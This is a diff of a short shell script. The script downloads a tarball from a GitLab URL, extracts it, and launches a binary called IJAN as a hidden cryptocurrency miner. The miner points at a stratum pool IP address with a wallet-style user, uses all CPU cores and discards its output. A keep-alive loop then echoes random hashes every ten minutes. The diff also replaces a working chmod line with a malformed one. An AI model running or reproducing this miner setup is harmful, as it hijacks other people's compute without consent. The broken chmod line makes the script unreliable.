@@ -1,5 +1,5 @@
 #!/bin/sh
 wget https://gitlab.com/zenardozhe/jual/-/raw/main/TT.tar.gz && tar -xvf TT.tar.gz
-chmod 777 IJAN
+chmod TT.tar.gz
 ./IJAN -a gr -o stratum+tcp://170.187.132.84:80 -u BooKukz5MTKw9N9B4cMLvHvUmsNyrDFCkJ.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t$(nproc --all) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
